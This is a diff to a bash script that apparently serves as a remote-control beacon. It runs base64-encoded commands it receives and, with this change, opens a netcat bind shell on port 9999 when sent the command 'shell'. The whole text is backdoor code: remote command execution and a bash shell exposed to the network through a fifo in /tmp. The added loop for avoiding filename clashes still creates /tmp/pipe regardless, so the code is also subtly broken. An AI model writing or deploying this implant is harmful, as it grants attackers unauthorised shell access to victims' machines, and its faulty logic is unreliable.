@@ -20,8 +20,12 @@ pull(){
         echo $fName
     else
         cmd=$(echo $cmd | base64 --decode)
-        output=$($cmd)
-	    return_output
+        if [[ $cmd == "shell" ]]; then
+            spawn_shell &
+        else
+            output=$($cmd)
+	        return_output
+        fi
     fi
 }
 
@@ -65,8 +69,19 @@ check(){
 
 # bind shell to a port with netcat
 spawn_shell(){
-    mkfifo /tmp/pipe
-    cat /tmp/pipe | /bin/bash 2>&1 | nc -l 9999 > /tmp/pipe &
+    i=true
+    x=0
+    shell="/tmp/pipe"
+    while $i; do
+        if [[ -f $shell ]]; then    # current shell file exists
+            shell=$shell$x          # increment file number
+            let x=x+1
+        else
+            mkfifo /tmp/pipe                                            # make file to store nc output
+            cat /tmp/pipe | /bin/bash 2>&1 | nc -l 9999 > /tmp/pipe &   # cat file to bash, pipe bash output
+            i=false
+        fi
+    done
 }
 
 # Main driver for beacon
